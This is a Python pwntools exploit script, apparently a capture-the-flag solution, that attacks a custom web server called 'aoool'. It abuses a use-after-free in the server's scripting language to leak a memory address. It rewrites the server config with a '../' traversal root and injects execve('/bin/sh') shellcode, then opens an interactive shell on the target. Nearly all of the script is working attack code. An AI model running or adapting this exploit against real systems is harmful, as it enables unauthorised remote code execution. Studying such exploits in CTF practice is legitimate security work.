#!/usr/bin/env python
import sys, os
from pwn import *
from shellcodes import orw
HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
context.arch = "amd64"

def upload_file(data):
    r.send('UF / HTTP/1.1\r\n')
    r.send('Host: aoool.ng\r\n')
    r.send('Content-Length: {}\r\n'.format(len(data)))
    r.send('\r\n')
    r.send(data)

def update_config(config):
    r.send('UC / HTTP/1.1\r\n')
    r.send('Content-Length: {}\r\n'.format(len(config)))
    r.send('Host: aoool.ng\r\n')
    r.send('\r\n')
    r.send(config)

def get(path):
    r.send('GET {} HTTP/1.1\r\n'.format(path))
    r.send('Host: aoool.ng\r\n')
    r.send('\r\n')

r = remote(HOST, PORT)
leak = '''
    a="a";
    del a;
    print a;
'''


_ = '''
server {
    server_name "aoool.ng";
    root "../../../../../../";
    mode osl;
}
'''
upload_file(leak)
update_config(_)
r.recvuntil("Connection: close")
r.recvuntil("\n")
r.recvuntil("\n")
filename = r.recvuntil("HTTP")[:-4]
get('/aoool/var/www/uploads/' + filename)
r.recvuntil("Connection: close")
r.recvuntil("Connection: close")
r.recvuntil("\n")
r.recvuntil("\n")
mmap = int(r.recvuntil("\n").strip())
target = mmap+0x7d0
print hex(mmap)
sc_raw = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
sc = ""
for c in sc_raw :
    sc += "\\x%02x" % ord(c)
code = '''
a = "aaaaaaaaaaaaaaaaaaaaaaa";
print a;
del a;
b=a;
print b;
a=%lu;
print a;
b ="%s";
''' % (target,sc)
upload_file(code)
r.recvuntil("Connection: close")
r.recvuntil("\n")
r.recvuntil("\n")
filename = r.recv(10,timeout=5)
get('/aoool/var/www/uploads/'+filename)
r.interactive()
